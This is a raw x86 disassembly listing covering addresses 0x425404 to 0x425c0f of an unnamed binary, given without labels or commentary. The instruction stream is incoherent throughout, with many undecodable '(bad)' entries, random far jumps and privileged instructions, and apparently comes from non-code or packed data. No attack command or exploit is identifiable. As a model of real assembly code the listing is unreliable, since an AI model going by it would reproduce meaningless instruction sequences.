  425404:	int    0xa3
  425406:	icebp  
  425407:	jmp    0xa7885874
  42540c:	dec    edi
  42540d:	and    DWORD PTR [eax+0x65f73214],ebp
  425413:	sbb    DWORD PTR [esi],esi
  425415:	add    al,0x98
  425417:	xor    esi,ebx
  425419:	sub    DWORD PTR [edx-0x4],0x54a8fbc2
  425420:	adc    BYTE PTR [edx],bl
  425422:	rol    BYTE PTR ds:0xe417b89c,0xb0
  425429:	hlt    
  42542a:	inc    ebx
  42542b:	cs stos BYTE PTR es:[edi],al
  42542d:	ja     0x4253dc
  42542f:	inc    edx
  425430:	add    al,0xb0
  425432:	cmp    BYTE PTR [ebx+0x263c48c4],al
  425438:	sub    eax,0xbceb3d41
  42543d:	fist   DWORD PTR [edx]
  42543f:	mov    ds:0x3b16fd1,eax
  425444:	cs or  eax,0x5a84b107
  42544a:	ja     0x4253f4
  42544c:	(bad)  
  42544d:	adc    ch,ah
  42544f:	inc    eax
  425450:	pop    es
  425451:	dec    eax
  425452:	mov    WORD PTR [esi-0x22c261d0],gs
  425458:	cli    
  425459:	in     eax,0x84
  42545b:	fadd   st,st(6)
  42545d:	dec    esp
  42545e:	(bad)  
  42545f:	xchg   ebx,eax
  425460:	adc    esi,eax
  425462:	fisubr WORD PTR [ebx]
  425464:	mov    ah,0x3d
  425466:	adc    al,dh
  425468:	jecxz  0x4254a8
  42546a:	pop    ebx
  42546b:	mov    ebp,0xcfaff7bc
  425470:	add    DWORD PTR [ebp+0x58e7572],edx
  425476:	sbb    DWORD PTR [ebx],edi
  425478:	test   eax,0x7ea0b4a1
  42547d:	mov    ds:0x3830b762,al
  425482:	ret    
  425483:	leave  
  425484:	pusha  
  425485:	arpl   WORD PTR [esi-0x6d],bx
  425488:	mov    edi,0x77e9f1a4
  42548d:	sti    
  42548e:	push   edi
  42548f:	loop   0x42543c
  425491:	mov    ah,dl
  425493:	jne    0x4254c1
  425495:	leave  
  425496:	mov    bh,0x10
  425498:	mov    ebp,0xe6062c17
  42549d:	xor    dl,BYTE PTR [edi]
  42549f:	sar    DWORD PTR [esi],cl
  4254a1:	mov    ebx,0xe2d61559
  4254a6:	std    
  4254a7:	fnstcw WORD PTR [ebp-0x27018849]
  4254ad:	add    esi,ebp
  4254af:	jmp    0x9722:0x94d14eee
  4254b6:	fsubrp st(2),st
  4254b8:	mov    ds:0x844e6209,eax
  4254bd:	lea    edx,[eax]
  4254bf:	int3   
  4254c0:	inc    ebp
  4254c1:	sub    edi,ebp
  4254c3:	ds into 
  4254c5:	leave  
  4254c6:	sub    DWORD PTR ds:[ecx-0x6a7b3d16],ebx
  4254cd:	mov    eax,ds:0x29f255b8
  4254d2:	adc    BYTE PTR es:[edx],0x7d
  4254d6:	sub    bh,ah
  4254d8:	aas    
  4254d9:	in     al,dx
  4254da:	outs   dx,DWORD PTR ds:[esi]
  4254db:	dec    edx
  4254dc:	inc    ebx
  4254dd:	jnp    0x4254ac
  4254df:	mov    edx,0x391ed6e
  4254e4:	xchg   edi,eax
  4254e5:	push   esp
  4254e6:	mov    ch,0xc2
  4254e8:	xor    edi,DWORD PTR [ebp+0x63]
  4254eb:	outs   dx,BYTE PTR ds:[esi]
  4254ec:	arpl   WORD PTR [ebx],ax
  4254ee:	test   al,0x43
  4254f0:	add    eax,0x11ff462c
  4254f5:	(bad)  
  4254f6:	sti    
  4254f7:	test   DWORD PTR [ebx],ebp
  4254f9:	bound  esp,QWORD PTR [edi+0x6afaa73a]
  4254ff:	loop   0x425490
  425501:	jne    0x425508
  425503:	xchg   ecx,eax
  425504:	push   ss
  425505:	mov    ds:0xf1cf8493,al
  42550a:	pop    edx
  42550b:	and    al,0xbe
  42550d:	mov    ds:0x884ef51a,al
  425512:	jl     0x4254b7
  425514:	ffreep st(2)
  425516:	push   ebp
  425517:	stc    
  425518:	hlt    
  425519:	stos   BYTE PTR es:[edi],al
  42551a:	aaa    
  42551b:	adc    ch,BYTE PTR [ebp-0x2e]
  42551e:	nop
  42551f:	mov    dl,0x71
  425521:	pop    esp
  425522:	scas   eax,DWORD PTR es:[edi]
  425523:	stos   DWORD PTR es:[edi],eax
  425524:	and    edx,edi
  425526:	fnsave [edi*8-0x3330f72c]
  42552d:	cmp    eax,0x99761f48
  425532:	jmp    0x826:0x7034f4ac
  425539:	jg     0x425539
  42553b:	add    BYTE PTR [eax+0x2b],dl
  42553e:	cmp    eax,edx
  425540:	jl     0x425528
  425542:	retf   
  425543:	addr16 loop 0x4255b8
  425546:	jno    0x42555e
  425548:	jbe    0x42556c
  42554a:	repz sub dh,dl
  42554d:	dec    edx
  42554e:	in     eax,dx
  42554f:	xor    al,0x2f
  425551:	or     eax,0xfa84f8d4
  425556:	pop    ebx
  425557:	(bad)  
  425558:	mov    ah,0x44
  42555a:	mov    ah,0x8c
  42555c:	mov    esi,DWORD PTR [esi+0x61d6cd6d]
  425562:	nop
  425563:	ror    DWORD PTR [ecx+eax*4+0x70],0xb
  425568:	mov    esi,0xc048fef9
  42556d:	sub    al,0x25
  42556f:	pop    ss
  425570:	push   0xffffff8b
  425572:	bound  esp,QWORD PTR [ebp-0x51b920c1]
  425578:	fcom   QWORD PTR [ebx-0x1d]
  42557b:	inc    edx
  42557c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42557d:	mov    esp,ebp
  42557f:	dec    ebp
  425580:	mov    dh,0x5b
  425582:	mov    bh,0x64
  425584:	xchg   ebx,eax
  425585:	sub    al,0xb7
  425587:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425588:	int3   
  425589:	cmc    
  42558a:	inc    esp
  42558b:	sub    BYTE PTR [ebx+edx*2+0x1ccbf34c],dh
  425592:	lea    ecx,[edi+0x4c96bbc4]
  425598:	pop    es
  425599:	ret    
  42559a:	addr16 jb 0x4255a2
  42559d:	push   cs
  42559e:	call   0xd642b69e
  4255a3:	ds add eax,0x39e3e56f
  4255a9:	fwait
  4255aa:	or     BYTE PTR [ebp-0x71],al
  4255ad:	int    0x7b
  4255af:	and    al,0xbf
  4255b1:	xchg   WORD PTR [edx+0x486d2de2],dx
  4255b8:	add    al,0x60
  4255ba:	dec    ecx
  4255bb:	test   BYTE PTR [ecx-0x2a],dl
  4255be:	inc    ebx
  4255bf:	test   BYTE PTR [edi+0x49ccfe2e],cl
  4255c5:	dec    esi
  4255c6:	push   ecx
  4255c7:	push   0x3
  4255c9:	lock adc DWORD PTR [edi+0x7e2e9cd8],ecx
  4255d0:	xor    ah,BYTE PTR [edx]
  4255d2:	sti    
  4255d3:	xor    dh,BYTE PTR [ecx+0x50e1429c]
  4255d9:	add    DWORD PTR [ecx-0x46],0x70
  4255dd:	loope  0x425647
  4255df:	push   eax
  4255e0:	jae    0x42559b
  4255e2:	or     ebx,DWORD PTR [ebx-0x9642a7f]
  4255e8:	push   edx
  4255ea:	add    al,0xf6
  4255ec:	adc    cl,dl
  4255ee:	mov    edx,0xa24a744b
  4255f3:	ja     0x425575
  4255f5:	ret    
  4255f6:	xor    DWORD PTR [esi],0x60
  4255f9:	add    DWORD PTR ds:0x69bced2,ebp
  4255ff:	add    DWORD PTR [esi],0xffffff86
  425602:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425603:	sbb    ebp,DWORD PTR [eax]
  425605:	fisubr DWORD PTR ds:0x4bb865cd
  42560b:	xchg   BYTE PTR ds:0xd3223473,dh
  425611:	aaa    
  425612:	mov    edx,0x7448b972
  425617:	push   cs
  425618:	add    eax,0xc7ef56dc
  42561d:	mov    eax,0xe48d2241
  425622:	dec    edx
  425623:	int    0xd5
  425625:	ret    0x782c
  425628:	mov    bh,dl
  42562a:	inc    esp
  42562b:	or     dh,cl
  42562d:	pop    eax
  42562e:	xlat   BYTE PTR ds:[ebx]
  42562f:	pop    eax
  425630:	and    bl,BYTE PTR [ebp+0x57]
  425633:	sub    ebx,esi
  425635:	jmp    0xbef45ddd
  42563a:	fnstenv gs:[esp+esi*4]
  42563e:	(bad)  
  42563f:	sti    
  425640:	xor    eax,0x51c768b2
  425645:	sbb    BYTE PTR [edi],ch
  425647:	das    
  425648:	lea    ebx,[esi+0x51f07db9]
  42564e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42564f:	jmp    0xa2e5:0xb49e6369
  425656:	call   0x67d6:0x3c815434
  42565d:	inc    edi
  42565e:	ror    BYTE PTR ds:[esi],1
  425661:	pop    ebp
  425662:	arpl   cx,di
  425664:	imul   BYTE PTR [ebx]
  425666:	outs   dx,DWORD PTR ds:[esi]
  425667:	(bad)  
  425668:	xor    ecx,DWORD PTR [ebp+0x69dae524]
  42566e:	mov    BYTE PTR [edi-0x68],ah
  425671:	pop    ds
  425672:	lea    edx,[ebx]
  425674:	sahf   
  425675:	cdq    
  425676:	sbb    al,0xb3
  425678:	aas    
  425679:	in     al,0xff
  42567b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42567c:	jae    0x42565b
  42567e:	je     0x4256f6
  425680:	pop    eax
  425681:	lds    eax,FWORD PTR [eax+eax*2]
  425684:	dec    eax
  425685:	shl    BYTE PTR [ebx],0x26
  425688:	adc    ebp,DWORD PTR [ebx]
  42568a:	loope  0x425700
  42568c:	cmp    DWORD PTR [esi+0x33],esp
  42568f:	pop    esp
  425690:	js     0x4256e8
  425692:	sub    bl,BYTE PTR [ecx+0x21649a6c]
  425698:	push   eax
  425699:	xchg   bl,al
  42569b:	cmp    DWORD PTR [esi+0xe],esi
  42569e:	ss int3 
  4256a0:	(bad)  
  4256a1:	push   cs
  4256a2:	cdq    
  4256a3:	adc    al,0x6
  4256a5:	mov    al,ds:0x4d0b5ec5
  4256aa:	test   al,ch
  4256ac:	mov    bl,0x8f
  4256ae:	das    
  4256af:	and    cl,BYTE PTR [esi+0x1a]
  4256b2:	or     eax,0xe1339c65
  4256b7:	mov    bh,0x10
  4256b9:	(bad)  
  4256ba:	xor    eax,0xdf2eccc5
  4256bf:	mov    bh,0x5d
  4256c1:	add    eax,0x5d1d4df7
  4256c6:	pop    eax
  4256c7:	push   edi
  4256c8:	stos   DWORD PTR es:[edi],eax
  4256c9:	mov    ah,0x1
  4256cb:	addr16 inc edi
  4256cd:	dec    DWORD PTR [esi-0x2dac2f14]
  4256d3:	aam    0xd5
  4256d5:	repnz sub esi,DWORD PTR [edi+0x556ea553]
  4256dc:	xchg   esi,eax
  4256dd:	pop    eax
  4256de:	inc    esi
  4256df:	jl     0x4256a5
  4256e1:	(bad)  
  4256e2:	pop    esp
  4256e3:	mov    ah,0x4e
  4256e5:	pusha  
  4256e6:	xchg   ebp,eax
  4256e7:	in     al,0xe0
  4256e9:	fcmovb st,st(4)
  4256eb:	aaa    
  4256ec:	test   edx,ecx
  4256ee:	call   0xdde9:0x6f61985e
  4256f5:	and    DWORD PTR [edx+0x5d28cc27],0x1379c9c8
  4256ff:	in     eax,dx
  425700:	pusha  
  425701:	sub    BYTE PTR [ebx+eiz*1-0x2f],0x5f
  425706:	imul   ebx,DWORD PTR [ecx-0xd56a0a2],0xfffffff9
  42570d:	imul   bp,WORD PTR [edx+0x23],0xffcd
  425712:	loop   0x4256c6
  425714:	mov    eax,0x85e082e
  425719:	ss xor al,0x7f
  42571c:	dec    esi
  42571d:	pop    ebp
  42571e:	dec    ebx
  42571f:	xchg   bl,ah
  425721:	xchg   ebx,eax
  425722:	nop
  425723:	cdq    
  425724:	popf   
  425725:	test   DWORD PTR [eax],ecx
  425727:	ss or  al,ch
  42572a:	mov    bl,0x2b
  42572c:	ficom  WORD PTR [ecx+0x16282a64]
  425732:	fsubr  st(4),st
  425734:	mov    ebx,0x1ea1a113
  425739:	mov    BYTE PTR [ebp-0x350e579d],bl
  42573f:	aad    0x7c
  425741:	mov    al,ds:0xe21a6d2d
  425746:	in     al,dx
  425747:	(bad)  
  425749:	sar    BYTE PTR [edi+0x7a],cl
  42574c:	dec    ebp
  42574d:	sub    BYTE PTR [edi],dh
  42574f:	(bad)  
  425753:	sbb    al,al
  425755:	rcr    esp,cl
  425757:	fwait
  425758:	add    BYTE PTR [esi],0x98
  42575b:	lahf   
  42575c:	mov    ds:0x8d15b48c,eax
  425761:	ret    
  425762:	jl     0x425747
  425764:	out    dx,eax
  425765:	scas   al,BYTE PTR es:[edi]
  425766:	add    DWORD PTR [esi],edi
  425768:	pop    es
  425769:	jmp    0x425743
  42576b:	call   DWORD PTR [ecx-0x41]
  42576e:	ret    
  42576f:	xor    esp,0x80a221da
  425775:	out    0xd9,al
  425777:	xor    al,0x23
  425779:	out    dx,al
  42577a:	dec    ebp
  42577b:	dec    BYTE PTR [eax-0x44]
  42577e:	sub    bl,BYTE PTR [ecx-0x63]
  425781:	cmc    
  425782:	jo     0x425800
  425784:	ins    DWORD PTR es:[edi],dx
  425785:	aam    0xeb
  425787:	fld    st(0)
  425789:	cld    
  42578a:	sti    
  42578b:	lea    ebx,[eax+0x6d31cbc9]
  425791:	jnp    0x425717
  425793:	nop
  425794:	gs fwait
  425796:	jbe    0x425742
  425798:	and    ah,bl
  42579a:	adc    DWORD PTR [eax],edi
  42579c:	and    BYTE PTR [eax+0x2ce5ca86],bh
  4257a2:	jb     0x4257f9
  4257a4:	add    BYTE PTR [eax],al
  4257a6:	add    BYTE PTR [eax],al
  4257a8:	add    BYTE PTR [eax],al
  4257aa:	dec    edx
  4257ab:	inc    ebx
  4257ac:	push   ebp
  4257ad:	push   esi
  4257ae:	pop    ebp
  4257af:	push   esi
  4257b0:	dec    ebx
  4257b1:	pop    edi
  4257b2:	idiv   bl
  4257b4:	(bad)
  4257b8:	bound  esp,QWORD PTR [esi+0x1e570]
  4257be:	add    BYTE PTR [esi],0x0
  4257c1:	add    BYTE PTR [edx-0x45c7c05b],al
  4257c7:	ficom  DWORD PTR [ebx+0x2337302f]
  4257cd:	icebp  
  4257ce:	arpl   WORD PTR [esi+0x3a],bx
  4257d1:	mov    WORD PTR [di],?
  4257d4:	mov    dh,0xf8
  4257d6:	mov    BYTE PTR [edx-0x3ee8f06f],bh
  4257dc:	add    eax,0x2a46a8c4
  4257e1:	test   al,0x27
  4257e3:	mov    esi,0x38c7217a
  4257e8:	fiadd  WORD PTR [esp+esi*2]
  4257eb:	push   eax
  4257ec:	push   ecx
  4257ed:	mov    dl,0x49
  4257ef:	push   esi
  4257f0:	icebp  
  4257f1:	dec    ebx
  4257f2:	bound  esi,QWORD PTR [edi+ecx*1-0x40]
  4257f6:	test   dh,ah
  4257f8:	in     eax,0xd7
  4257fa:	inc    ebp
  4257fb:	inc    eax
  4257fc:	mov    al,0x52
  4257fe:	mov    edi,0x53d9b774
  425803:	out    dx,eax
  425804:	sbb    ecx,DWORD PTR [eax]
  425806:	das    
  425807:	loope  0x425802
  425809:	cmp    al,0xb6
  42580b:	ins    BYTE PTR es:[edi],dx
  42580c:	fnstcw WORD PTR [ebx]
  42580e:	fidivr DWORD PTR [eax+edx*1-0x4f2ceb6a]
  425815:	cmp    dh,ch
  425817:	jecxz  0x425817
  425819:	xchg   ebx,eax
  42581a:	je     0x4257d8
  42581c:	(bad)  
  42581d:	test   al,0xe5
  42581f:	inc    edx
  425820:	aam    0xa4
  425822:	mov    edx,0x4dd39e5b
  425827:	cld    
  425828:	and    eax,eax
  42582a:	enter  0x81e,0x4
  42582e:	mov    ds:0x71ab6eb0,eax
  425833:	das    
  425834:	(bad)  
  425836:	pusha  
  425837:	div    dl
  425839:	pusha  
  42583a:	jb     0x425814
  42583c:	cmp    ebx,DWORD PTR [ebx+esi*2-0x35]
  425840:	jmp    0x42583d
  425842:	mov    fs,WORD PTR [ecx]
  425844:	dec    edx
  425845:	adc    cl,BYTE PTR [edi]
  425847:	sar    ecx,0xd8
  42584a:	jg     0x42585c
  42584c:	and    eax,0x1f12304b
  425851:	and    DWORD PTR [esi+edx*4+0x28],0x951e9c41
  425859:	adc    edi,DWORD PTR [ebp+0x37]
  42585c:	ds pop eax
  42585e:	add    ebp,DWORD PTR [esi-0x523bda37]
  425864:	cmp    al,0x29
  425866:	in     eax,0xc2
  425868:	mov    ah,0x5f
  42586a:	add    ah,BYTE PTR [eax]
  42586c:	arpl   ax,si
  42586e:	js     0x425825
  425870:	in     eax,0xff
  425872:	pop    ebx
  425873:	test   eax,0x88d0698b
  425878:	stos   BYTE PTR es:[edi],al
  425879:	mov    al,ds:0x21538a8a
  42587e:	pop    edx
  42587f:	in     al,dx
  425880:	mov    eax,0x3b7d526d
  425885:	and    DWORD PTR [edx+0x4f11cffc],ecx
  42588b:	xchg   ecx,eax
  42588c:	iret   
  42588d:	xchg   esi,eax
  42588e:	mov    dl,0xf2
  425890:	and    eax,0xf017f18d
  425895:	cmp    esi,ebp
  425897:	hlt    
  425898:	pop    ecx
  425899:	push   0xa6ec245e
  42589e:	jo     0x425838
  4258a0:	aas    
  4258a1:	dec    ebx
  4258a2:	xchg   esp,eax
  4258a3:	mov    DWORD PTR [edi-0x7a],ecx
  4258a6:	push   ebp
  4258a7:	and    eax,0xca3a3038
  4258ac:	adc    dl,BYTE PTR [ecx]
  4258ae:	and    BYTE PTR [eax-0x44a5db11],cl
  4258b4:	push   esi
  4258b5:	adc    al,0x5d
  4258b7:	adc    al,0xcd
  4258b9:	es jle 0x4258d9
  4258bc:	or     eax,DWORD PTR [eax+0x3b7a9294]
  4258c2:	cwde   
  4258c3:	inc    edi
  4258c4:	sbb    esp,DWORD PTR [eax]
  4258c6:	sbb    bl,BYTE PTR [edi+0x6fbf7951]
  4258cc:	mov    ah,0x8
  4258ce:	push   ds
  4258cf:	xlat   BYTE PTR ds:[ebx]
  4258d0:	push   edx
  4258d1:	cmp    ah,ch
  4258d3:	loope  0x4258da
  4258d5:	or     al,0xf
  4258d7:	out    0x2f,al
  4258d9:	dec    ebx
  4258da:	mov    dl,0x1
  4258dc:	or     DWORD PTR [esi+0xb5da3b2],eax
  4258e2:	pop    ds
  4258e3:	test   eax,0xf1fde2f7
  4258e8:	pop    esi
  4258e9:	mov    ebx,0x3a08e3a5
  4258ee:	stc    
  4258ef:	cmp    BYTE PTR [edx-0x16],0xdc
  4258f3:	cmovbe esi,DWORD PTR [ecx+eiz*2]
  4258f7:	shl    BYTE PTR [edx+ebp*4-0x23],cl
  4258fb:	mov    dl,0xad
  4258fd:	pop    ss
  4258fe:	jg     0x4258c4
  425900:	and    ebp,esp
  425902:	ins    DWORD PTR es:[edi],dx
  425903:	adc    ax,0xc0ad
  425907:	sti    
  425908:	or     eax,esp
  42590a:	popf   
  42590b:	(bad)  
  42590c:	aam    0x32
  42590e:	xor    eax,0x918c726b
  425913:	iret   
  425914:	push   ds
  425915:	jle    0x425953
  425917:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425918:	lock dec edx
  42591a:	outs   dx,DWORD PTR cs:[esi]
  42591c:	popf   
  42591d:	jecxz  0x4258dd
  42591f:	xchg   esp,eax
  425920:	mov    ebx,0x800abcd9
  425925:	jns    0x425971
  425927:	or     ch,BYTE PTR [esi+0x3a]
  42592a:	or     eax,0x77d3385f
  42592f:	add    bh,BYTE PTR ds:0x1da1ffb7
  425935:	inc    esi
  425936:	ret    
  425937:	in     al,dx
  425938:	and    eax,0x9955f2af
  42593d:	mov    ds:0x8e7f516a,eax
  425942:	mov    dh,0x7f
  425944:	xchg   edi,eax
  425945:	adc    esi,0xb
  425948:	cmp    ch,BYTE PTR [edi]
  42594a:	mov    dh,BYTE PTR [ecx+0x3e]
  42594d:	inc    esi
  42594e:	aaa    
  42594f:	test   BYTE PTR [ebx*4-0x4c3dc491],dl
  425956:	ror    DWORD PTR [edx+0x1e],0x23
  42595a:	adc    BYTE PTR [esi-0x5d],0x8a
  42595e:	rdpmc  
  425960:	int    0x7b
  425962:	ret    
  425963:	lahf   
  425964:	cld    
  425965:	pushf  
  425966:	inc    esi
  425967:	repnz and ah,BYTE PTR gs:[ecx]
  42596b:	iret   
  42596c:	add    eax,0xa920b5e6
  425971:	jle    0x425975
  425973:	xor    DWORD PTR [ebx-0x69b1ab03],ebx
  425979:	(bad)  
  42597a:	in     al,0x95
  42597c:	inc    esi
  42597d:	loope  0x4259e0
  42597f:	imul   ebp,DWORD PTR [ecx],0x84fb8cab
  425985:	inc    eax
  425986:	cwde   
  425987:	jge    0x425975
  425989:	jne    0x1977b202
  42598f:	fwait
  425990:	aam    0x85
  425992:	push   edx
  425993:	xchg   esp,eax
  425994:	inc    esp
  425995:	mov    ds:0x2a09067c,al
  42599a:	inc    esp
  42599b:	sbb    DWORD PTR cs:[ebp-0x7109f9a3],eax
  4259a2:	push   0x43
  4259a4:	dec    edi
  4259a5:	add    BYTE PTR [edi-0x120368e7],ch
  4259ab:	enter  0x93b8,0x42
  4259af:	sbb    BYTE PTR [esi-0x4b],ch
  4259b2:	sbb    ecx,eax
  4259b4:	push   ecx
  4259b5:	ret    0x6d84
  4259b8:	inc    ecx
  4259b9:	data16 repz loop 0x425943
  4259bd:	adc    al,0x9c
  4259bf:	and    bh,BYTE PTR ds:0x1ffee8f9
  4259c5:	jb     0x4259d6
  4259c7:	adc    ebp,DWORD PTR [ebx]
  4259c9:	shr    DWORD PTR [eax+0x3d],cl
  4259cc:	aam    0xbf
  4259ce:	cmp    bh,dl
  4259d0:	mov    ch,0xa8
  4259d2:	sbb    al,0xf3
  4259d4:	cmp    BYTE PTR [edx+0x6f],dh
  4259d7:	sti    
  4259d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4259d9:	adc    eax,0xc009dc71
  4259de:	mov    dl,0x76
  4259e0:	stc    
  4259e1:	or     al,0x5d
  4259e3:	shl    BYTE PTR [ebp-0x72],0xdc
  4259e7:	ds nop
  4259e9:	sbb    BYTE PTR [ebx+0x63be2aa4],dh
  4259ef:	fwait
  4259f0:	adc    BYTE PTR [edx+eax*8-0x1134a038],bh
  4259f7:	lods   eax,DWORD PTR ds:[esi]
  4259f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4259f9:	pop    ss
  4259fa:	mov    eax,ds:0x8ad9709a
  4259ff:	pop    edx
  425a00:	cli    
  425a01:	xchg   ebx,eax
  425a02:	scas   al,BYTE PTR es:[edi]
  425a03:	gs and eax,0x4dd94576
  425a09:	mov    ah,0x91
  425a0b:	test   edx,esp
  425a0d:	out    dx,eax
  425a0e:	pop    ebp
  425a0f:	dec    edi
  425a10:	lea    esi,[eax+0x1505fd3b]
  425a16:	adc    dh,BYTE PTR [edx-0x42]
  425a19:	icebp  
  425a1a:	popa   
  425a1b:	ds inc edi
  425a1d:	test   DWORD PTR [ebx-0x5ac8b4b3],edx
  425a23:	push   eax
  425a24:	lahf   
  425a25:	scas   eax,DWORD PTR es:[edi]
  425a26:	adc    BYTE PTR [edi],bl
  425a28:	aaa    
  425a29:	lock popf 
  425a2b:	lock fidiv WORD PTR [ebp-0x2ffe07c1]
  425a32:	stc    
  425a33:	lock and BYTE PTR [edi-0x27],bl
  425a37:	cmp    cl,ah
  425a39:	ret    
  425a3a:	aas    
  425a3b:	sub    BYTE PTR [edx+0x6b],bh
  425a3e:	sub    BYTE PTR [ecx],dh
  425a40:	adc    al,0x6f
  425a42:	xor    dl,bh
  425a44:	xchg   ebx,eax
  425a45:	ja     0x425a5c
  425a47:	daa    
  425a48:	shr    DWORD PTR [ecx+0x2ea0bf51],cl
  425a4e:	cld    
  425a4f:	mov    bl,0xcd
  425a51:	out    dx,eax
  425a52:	push   edi
  425a53:	mov    al,ds:0xf2a2dc5d
  425a58:	cmp    BYTE PTR [esi+0x63],cl
  425a5b:	fadd   QWORD PTR [ecx]
  425a5d:	adc    eax,0xa4e01569
  425a62:	inc    esp
  425a63:	mov    dl,0x46
  425a65:	repnz and esi,eax
  425a68:	add    DWORD PTR [bp+si+0x17a5],eax
  425a6d:	jl     0x425a00
  425a6f:	gs daa 
  425a71:	mov    bl,0xf8
  425a73:	pop    ebp
  425a74:	fistp  WORD PTR [eax+0x7509cbac]
  425a7a:	pusha  
  425a7b:	mov    esp,0xbf2e150e
  425a80:	jb     0x425a6f
  425a82:	les    ebp,FWORD PTR [edx+edi*2+0x3c]
  425a86:	sbb    BYTE PTR [ebp-0x78a245],ah
  425a8c:	fisttp QWORD PTR [eax+0x5c]
  425a8f:	and    eax,0xe66c500b
  425a94:	mov    ah,bh
  425a96:	jbe    0x425a6f
  425a98:	jle    0x425af4
  425a9a:	fsub   DWORD PTR [eax]
  425a9c:	push   esp
  425a9d:	add    ch,bl
  425a9f:	push   ss
  425aa0:	js     0x425afd
  425aa2:	sub    DWORD PTR [eax+esi*8],edi
  425aa5:	cli    
  425aa6:	lahf   
  425aa7:	andnps xmm7,XMMWORD PTR ds:0x2e36484
  425aae:	sub    DWORD PTR [ebp-0x484c672b],edx
  425ab4:	cs ss std 
  425ab7:	and    eax,DWORD PTR [ebx]
  425ab9:	add    esp,DWORD PTR [ebx+0x2d]
  425abc:	jl     0x425b0e
  425abe:	ds hlt 
  425ac0:	int3   
  425ac1:	stc    
  425ac2:	(bad)  
  425ac3:	retf   0x1746
  425ac6:	pop    edi
  425ac7:	and    dl,ah
  425ac9:	mov    BYTE PTR ds:0x62bab63a,0x6e
  425ad0:	pop    ss
  425ad1:	xchg   esp,eax
  425ad2:	push   edx
  425ad3:	in     al,dx
  425ad4:	or     DWORD PTR [edi+0x8e61683],0xbd72a842
  425ade:	cmp    BYTE PTR [esi+0x0],bl
  425ae1:	push   es
  425ae2:	cmp    ah,BYTE PTR [edx+0x32]
  425ae5:	pop    eax
  425ae6:	cmp    DWORD PTR [ebp-0x2e01b501],esi
  425aec:	dec    esi
  425aed:	cmp    cl,dh
  425aef:	mov    esp,0x15e120f
  425af4:	stos   DWORD PTR es:[edi],eax
  425af5:	not    DWORD PTR [ecx]
  425af7:	pop    edx
  425af8:	sbb    DWORD PTR [esi+esi*8-0x38],esi
  425afc:	push   edx
  425afd:	addr16 mov ds:0x5b0a,al
  425b01:	pop    ebx
  425b02:	into   
  425b03:	fisub  WORD PTR [edx+ebp*2-0x11121c65]
  425b0a:	loope  0x425b41
  425b0c:	iret   
  425b0d:	je     0x425acd
  425b0f:	and    eax,DWORD PTR [edx]
  425b11:	pop    es
  425b12:	or     BYTE PTR [edx+0x55],al
  425b15:	push   0xffffffef
  425b17:	mov    bh,0xf
  425b19:	inc    edx
  425b1a:	xor    BYTE PTR [edx],dh
  425b1c:	in     eax,0xa6
  425b1e:	jle    0x425b4b
  425b20:	or     al,0x7b
  425b22:	cdq    
  425b23:	mov    ebp,ebp
  425b25:	ds dec esp
  425b27:	imul   esi,ebp,0xffffffe1
  425b2a:	mov    ch,0xec
  425b2c:	fsubr  st(2),st
  425b2e:	pusha  
  425b2f:	jge    0x425b1d
  425b31:	push   esi
  425b32:	(bad)  
  425b34:	mov    ch,0x17
  425b36:	mov    dh,0x78
  425b38:	call   0xda0f0815
  425b3d:	dec    ebx
  425b3e:	dec    ebx
  425b3f:	sbb    BYTE PTR fs:[ecx-0x503e6412],bh
  425b46:	std    
  425b47:	mov    ebx,0xd08030ce
  425b4c:	mov    ebp,0x607484c1
  425b51:	sar    esi,0xe0
  425b54:	or     eax,0x1834931f
  425b59:	std    
  425b5a:	push   cs
  425b5b:	xor    eax,0xe66f6ec
  425b60:	push   0xfffffff9
  425b62:	mov    esp,0xed7b29e3
  425b67:	sbb    edx,DWORD PTR [ecx+esi*4-0xc]
  425b6b:	es jne 0x425bb0
  425b6e:	push   0xb7ff69e4
  425b73:	mov    ds:0xf73690b6,eax
  425b78:	mov    BYTE PTR [ecx],dl
  425b7a:	push   0x60
  425b7c:	cmp    ebx,esi
  425b7e:	sar    bh,cl
  425b80:	jle    0x425bd2
  425b82:	mov    esi,0x8000ccb1
  425b87:	add    bl,0xe8
  425b8a:	imul   BYTE PTR [ebx]
  425b8c:	lea    ebp,[ecx-0x2b]
  425b8f:	add    dl,BYTE PTR [eax+0x2a]
  425b92:	mov    dh,0xfc
  425b94:	xor    DWORD PTR [eax+0x4ed3f10f],0xffffffec
  425b9b:	inc    edx
  425b9c:	ja     0x425b44
  425b9e:	add    DWORD PTR [ecx-0x4e],ebx
  425ba1:	dec    esi
  425ba2:	jecxz  0x425ba9
  425ba4:	test   eax,esp
  425ba6:	addr16 clc 
  425ba8:	repz dec esp
  425baa:	mov    al,0x1b
  425bac:	pop    edi
  425bad:	mov    ebp,0x62ee2735
  425bb2:	or     eax,0xff8b144b
  425bb7:	cmp    eax,0xef7210e5
  425bbc:	sbb    eax,0x5e0a54c7
  425bc1:	inc    edx
  425bc2:	or     esp,0x2d0c4563
  425bc8:	jl     0x425b76
  425bca:	jo     0x425c18
  425bcc:	aaa    
  425bcd:	or     ebp,DWORD PTR [eax]
  425bcf:	sbb    eax,0x39775e11
  425bd4:	inc    eax
  425bd5:	cld    
  425bd6:	pop    esp
  425bd7:	pop    esp
  425bd8:	push   es
  425bd9:	repnz mov al,ds:0xe3aab3da
  425bdf:	push   0xffffffe1
  425be1:	xor    eax,0x64ca6fe9
  425be6:	and    al,0x45
  425be8:	scas   eax,DWORD PTR es:[edi]
  425be9:	jecxz  0x425bd9
  425beb:	jmp    0x5bb3:0x51580562
  425bf2:	(bad)
  425bf6:	fs push 0xffffffea
  425bf9:	pop    ds
  425bfa:	scas   al,BYTE PTR es:[edi]
  425bfb:	fs das 
  425bfd:	fst    st(0)
  425bff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425c00:	cld    
  425c01:	push   0xcfd2744a
  425c06:	test   al,0xc1
  425c08:	les    edx,FWORD PTR [ecx]
  425c0a:	xchg   esi,eax
  425c0b:	sub    dl,BYTE PTR [ecx]
  425c0d:	jbe    0x425c48
  425c0f:	fistp  QWORD PTR [ebp-0x3e]
